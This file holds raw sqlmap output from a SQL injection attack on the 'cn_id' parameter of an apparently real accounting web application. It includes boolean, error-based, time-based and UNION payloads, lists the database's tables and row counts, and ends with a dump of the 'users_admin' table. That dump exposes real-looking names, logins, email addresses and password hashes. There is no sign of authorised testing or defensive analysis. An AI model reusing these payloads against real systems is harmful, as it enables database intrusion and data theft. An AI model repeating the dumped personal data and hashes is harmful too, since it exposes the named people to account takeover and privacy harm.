@@ -1,0 +1,167 @@
+sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:
+---
+Parameter: cn_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cn_id=25 AND 7065=7065
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cn_id=25 AND (SELECT 2783 FROM(SELECT COUNT(*),CONCAT(0x717a786271,(SELECT (ELT(2783=2783,1))),0x716b7a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cn_id=25 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 13 columns
+    Payload: cn_id=-8533 UNION ALL SELECT NULL,NULL,CONCAT(0x717a786271,0x6563794d5673734d57716b6e714f6b72625352566b5a53497945666965695a717158686b75614676,0x716b7a6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UCLX
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] exatt675_contabil
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cn_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cn_id=25 AND 7065=7065
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cn_id=25 AND (SELECT 2783 FROM(SELECT COUNT(*),CONCAT(0x717a786271,(SELECT (ELT(2783=2783,1))),0x716b7a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cn_id=25 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 13 columns
+    Payload: cn_id=-8533 UNION ALL SELECT NULL,NULL,CONCAT(0x717a786271,0x6563794d5673734d57716b6e714f6b72625352566b5a53497945666965695a717158686b75614676,0x716b7a6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UCLX
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: exatt675_contabil
+[35 tables]
++---------------------+
+| LogAcessoAdm        |
+| adm_func_cli        |
+| agendaXempresa      |
+| agendaXusuario      |
+| agenda_obrigacao    |
+| aniversarios        |
+| arq_txt_fat         |
+| arquivos            |
+| cadastro_empresa    |
+| certificados        |
+| clienteXusuario     |
+| est_civil           |
+| estado              |
+| faturamento         |
+| ferias              |
+| horario             |
+| horas               |
+| horas_extras_faltas |
+| imp_clientes        |
+| impostos            |
+| instrucao           |
+| niver_msg           |
+| noticias            |
+| pag_nome            |
+| paginas             |
+| permissoes          |
+| ponto_registro      |
+| regin               |
+| regin_eventos       |
+| socios              |
+| tb_cbo              |
+| tipo_arquivo        |
+| users_admin         |
+| usuarios            |
+| usuarios_clientes   |
++---------------------+
+
+Database: exatt675_contabil
++---------------------+---------+
+| Table               | Entries |
++---------------------+---------+
+| tb_cbo              | 2557    |
+| faturamento         | 1558    |
+| adm_func_cli        | 925     |
+| arquivos            | 334     |
+| horas               | 288     |
+| horas_extras_faltas | 224     |
+| cadastro_empresa    | 95      |
+| socios              | 93      |
+| aniversarios        | 88      |
+| LogAcessoAdm        | 68      |
+| usuarios_clientes   | 65      |
+| estado              | 27      |
+| agenda_obrigacao    | 25      |
+| pag_nome            | 17      |
+| paginas             | 17      |
+| impostos            | 13      |
+| instrucao           | 13      |
+| usuarios            | 13      |
+| est_civil           | 6       |
+| ferias              | 6       |
+| imp_clientes        | 6       |
+| noticias            | 6       |
+| tipo_arquivo        | 6       |
+| certificados        | 5       |
+| permissoes          | 4       |
+| users_admin         | 4       |
+| agendaXusuario      | 2       |
+| horario             | 2       |
+| niver_msg           | 1       |
+| regin               | 1       |
++---------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cn_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cn_id=25 AND 7065=7065
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cn_id=25 AND (SELECT 2783 FROM(SELECT COUNT(*),CONCAT(0x717a786271,(SELECT (ELT(2783=2783,1))),0x716b7a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cn_id=25 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 13 columns
+    Payload: cn_id=-8533 UNION ALL SELECT NULL,NULL,CONCAT(0x717a786271,0x6563794d5673734d57716b6e714f6b72625352566b5a53497945666965695a717158686b75614676,0x716b7a6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- UCLX
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: exatt675_contabil
+Table: users_admin
+[4 entries]
++---------+------------------------+------------+----------------------------------+------------------------+-------------+---------------+
+| user_id | user_nome              | user_login | user_senha                       | user_email             | user_status | user_ativacao |
++---------+------------------------+------------+----------------------------------+------------------------+-------------+---------------+
+| 1       | Everson Luis Schlemper | everson    | b1ab2a4e807ec6b2f66e0b960ddb49e2 | everson.lu@gmail.com   | 1           | 1             |
+| 7       | Teste                  | teste      | b1ab2a4e807ec6b2f66e0b960ddb49e2 | everson@exatty.com.br  | 1           | 1             |
+| 8       | Jucelia Agostinho      | jucelia    | 18b029ddf66f531b2f85e79eac4ceb97 | everson@exatty.com.br  | 1           | 0             |
+| 10      | Teste 3                | teste3     | 0401b0fb7e027c85c70b6d57ce96e265 | everson_lu@hotmail.com | 1           | 0             |
++---------+------------------------+------------+----------------------------------+------------------------+-------------+---------------+
+
